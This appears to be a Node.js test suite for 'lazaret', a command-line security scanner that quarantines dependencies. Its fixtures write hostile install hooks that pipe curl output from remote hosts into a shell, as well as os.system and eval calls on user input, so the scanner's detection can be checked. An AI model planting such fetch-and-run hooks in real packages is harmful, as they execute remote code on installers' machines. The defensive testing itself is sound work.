import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, writeFileSync, mkdirSync, rmSync, existsSync, readFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { run, version } from "../src/index.js";

function capture(argv, opts = {}) {
  const out = [], err = [];
  const code = run(argv, { out: (s) => out.push(s), err: (s) => err.push(s), ...opts });
  return { code, out: out.join("\n"), err: err.join("\n") };
}

test("default with no command prints the tagline and usage hint, exit 1", () => {
  const r = capture([]);
  assert.equal(r.code, 1);          // no command given → usage error
  assert.match(r.err, /no command given/);
  assert.match(r.err, /quarantine for your dependencies/);
});

test("--version prints version", () => {
  const r = capture(["--version"]);
  assert.equal(r.code, 0);
  assert.match(r.out, new RegExp(version.replaceAll(".", "\\.")));
});

test("--help exits 0 and shows usage", () => {
  const r = capture(["--help"]);
  assert.equal(r.code, 0);
  assert.match(r.out, /Usage:/);
  assert.match(r.out, /check <directory>/);
});

test("unknown command fails with 1", () => {
  assert.equal(capture(["bogus"]).code, 1);
  assert.match(capture(["bogus"]).err, /unknown command: bogus/);
});

test("check on missing directory exits 2 with error", () => {
  const r = capture(["check", join(tmpdir(), "lazaret-no-such-dir-xyz")]);
  assert.equal(r.code, 2);
  assert.match(r.err, /is not a directory/);
});

test("check on clean project: exit 0, gate PASSED, JSON+HTML written", () => {
  const d = mkdtempSync(join(tmpdir(), "lazaret-clean-"));
  try {
    writeFileSync(join(d, "app.py"), "def add(a, b):\n    return a + b\n");
    const r = capture(["check", d, "--no-html"]);
    assert.equal(r.code, 0);
    assert.match(r.out, /Quality gate: PASSED/);
    const rep = JSON.parse(readFileSync(join(d, "lazaret-report.json"), "utf8"));
    assert.equal(Object.keys(rep)[0], "generatedBy");
    assert.equal(rep.generatedBy, "lazaret-cli-1");
    assert.equal(rep.pass, true);
    assert.equal(rep.metrics.files, 1);
    assert.deepEqual(rep.conditions.map((c) => c.ok), [true, true, true, true, true, true]);
    assert.equal(existsSync(join(d, "lazaret-report.html")), false);
  } finally {
    rmSync(d, { recursive: true, force: true });
  }
});

test("check on vulnerable project: exit 1, report records findings", () => {
  const d = mkdtempSync(join(tmpdir(), "lazaret-vuln-"));
  try {
    writeFileSync(join(d, "app.py"), "import os\nos.system(user_cmd)\n");
    writeFileSync(join(d, "package.json"),
      JSON.stringify({ name: "evil", scripts: { postinstall: "curl http://x.sh | bash" } }));
    const r = capture(["check", d, "--no-html", "--quiet"]);
    assert.equal(r.code, 1);      // CRITICAL SC- finding → 48033f94 exit parity
    const rep = JSON.parse(readFileSync(join(d, "lazaret-report.json"), "utf8"));
    assert.equal(rep.pass, false);
    assert.ok(rep.issues.some((i) => i.rule === "S-OSCMD-PY"));
    assert.ok(rep.issues.some((i) => i.rule === "SC-INSTALL-HOOK" && i.sev === "CRITICAL"));
    assert.equal(rep.supplyChain, 1);
    assert.equal(rep.perFile["app.py"], 1);
  } finally {
    rmSync(d, { recursive: true, force: true });
  }
});

test("check with --ci exits 1 on gate failure even without CRITICAL SC-", () => {
  const d = mkdtempSync(join(tmpdir(), "lazaret-ci-"));
  try {
    writeFileSync(join(d, "app.py"), "import os\nos.system(user_cmd)\n");
    const r = capture(["check", d, "--no-html", "--quiet", "--ci"]);
    assert.equal(r.code, 1);
  } finally {
    rmSync(d, { recursive: true, force: true });
  }
});

test("--out-dir writes reports there; invalid --out-dir exits 3 before scanning", () => {
  const d = mkdtempSync(join(tmpdir(), "lazaret-out-"));
  const od = mkdtempSync(join(tmpdir(), "lazaret-outdir-"));
  try {
    writeFileSync(join(d, "app.py"), "x = 1\n");
    const r = capture(["check", d, "--out-dir", od, "--no-html", "--quiet"]);
    assert.equal(r.code, 0);
    assert.ok(existsSync(join(od, "lazaret-report.json")));
    assert.ok(!existsSync(join(d, "lazaret-report.json")));

    const bad = capture(["check", d, "--out-dir", join(od, "missing"), "--no-html"]);
    assert.equal(bad.code, 3);
    assert.match(bad.err, /--out-dir/);
  } finally {
    rmSync(d, { recursive: true, force: true });
    rmSync(od, { recursive: true, force: true });
  }
});

test("re-scan overwrites our own report (marker check) but never a foreign file", () => {
  const d = mkdtempSync(join(tmpdir(), "lazaret-marker-"));
  try {
    writeFileSync(join(d, "app.py"), "x = 1\n");
    assert.equal(capture(["check", d, "--no-html", "--quiet"]).code, 0);
    // second scan: our own report → overwrite fine
    assert.equal(capture(["check", d, "--no-html", "--quiet"]).code, 0);
    // foreign file at the destination → refused with exit 3
    writeFileSync(join(d, "lazaret-report.json"), "{\"someone\": \"else\"}");
    const r = capture(["check", d, "--no-html", "--quiet"]);
    assert.equal(r.code, 3);
    assert.match(r.err, /refusing to overwrite/);
    assert.equal(JSON.parse(readFileSync(join(d, "lazaret-report.json"), "utf8")).someone, "else");
  } finally {
    rmSync(d, { recursive: true, force: true });
  }
});

test("suppression markers (nosec / lazaret-ignore) suppress matching rules", () => {
  const d = mkdtempSync(join(tmpdir(), "lazaret-nosec-"));
  try {
    writeFileSync(join(d, "app.py"), "import os\nos.system(cmd)  # nosec S-OSCMD-PY\n");
    const r = capture(["check", d, "--no-html", "--quiet", "--no-json"]);
    assert.equal(r.code, 0);
  } finally {
    rmSync(d, { recursive: true, force: true });
  }
});

test("terminal output carries no ANSI escapes from scanned content (audit H1)", () => {
  const d = mkdtempSync(join(tmpdir(), "lazaret-ansi-"));
  try {
    writeFileSync(join(d, "app.py"), "x = \"\\u001b[31mRED\\u001b[0m\"\n");
    const r = capture(["check", d, "--no-html", "--no-json", "--quiet"]);
    assert.equal(r.code, 0);
    assert.ok(!r.out.includes("\u001b["));
    assert.ok(!r.err.includes("\u001b["));
  } finally {
    rmSync(d, { recursive: true, force: true });
  }
});

test("--include-deps scans node_modules content (dep rules only)", () => {
  const d = mkdtempSync(join(tmpdir(), "lazaret-dep-"));
  try {
    mkdirSync(join(d, "node_modules"), { recursive: true });
    writeFileSync(join(d, "app.py"), "x = 1\n");
    // SC-B64: a supply-chain indicator (dep-rule) hidden in a dependency.
    // eval() is NOT a dep rule, so it stays unreported in dep mode.
    writeFileSync(join(d, "node_modules", "evil-pkg.js"),
      'x = "' + "A".repeat(250) + '";\neval(userInput);\n');
    const without = capture(["check", d, "--no-html", "--no-json", "--quiet"]);
    assert.equal(without.code, 0);
    const withDeps = capture(["check", d, "--no-html", "--quiet", "--include-deps", "--ci"]);
    // supply-chain indicators (SC-*) ARE flagged in dep mode → gate fails → --ci exits 1
    assert.equal(withDeps.code, 1);
    const rep = JSON.parse(readFileSync(join(d, "lazaret-report.json"), "utf8"));
    const inDeps = rep.issues.filter((i) => i.file === "node_modules/evil-pkg.js");
    assert.ok(inDeps.some((i) => i.rule === "SC-B64"));
    assert.ok(!inDeps.some((i) => i.rule === "S-EVAL-JS"));   // quality rule filtered
    assert.equal(rep.metrics.files, 1);                        // app.py only
    assert.equal(rep.metrics.depFiles, 1);                     // evil-pkg.js counted as dep
  } finally {
    rmSync(d, { recursive: true, force: true });
  }
});

test("oversize file (>2MB) yields SC-TRUNCATED CRITICAL, exit 1, honest metrics", () => {
  const d = mkdtempSync(join(tmpdir(), "lazaret-big-"));
  try {
    writeFileSync(join(d, "big.py"), "x = 1\n" + "#".repeat(2_100_000) + "\n");
    writeFileSync(join(d, "small.py"), "y = 2\n");
    const r = capture(["check", d, "--no-html", "--quiet"]);
    assert.equal(r.code, 1);
    const rep = JSON.parse(readFileSync(join(d, "lazaret-report.json"), "utf8"));
    const t = rep.issues.find((i) => i.rule === "SC-TRUNCATED");
    assert.ok(t, "SC-TRUNCATED present");
    assert.equal(t.sev, "CRITICAL");
    assert.equal(t.file, "big.py");
    assert.equal(rep.metrics.files, 1);   // big.py NOT counted: we did not scan it
  } finally {
    rmSync(d, { recursive: true, force: true });
  }
});


// Dependency manifests are always scanned (quarantine stance): a hostile
// install hook in node_modules fails the scan even without --include-deps.
test("hostile dependency install hook fails the scan", () => {
  const dir = mkdtempSync(join(tmpdir(), "lz-dep-"));
  try {
    const dep = join(dir, "node_modules", "evil-pkg");
    mkdirSync(dep, { recursive: true });
    writeFileSync(join(dep, "package.json"), JSON.stringify({ name: "evil-pkg", scripts: {
      postinstall: "curl -s http://192.0.2.1/x | sh" } }, null, 2));
    writeFileSync(join(dir, "app.js"), "export const x = 1;\n");
    const r = capture(["check", dir, "--no-json", "--no-html", "--quiet"]);
    assert.equal(r.code, 1);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});
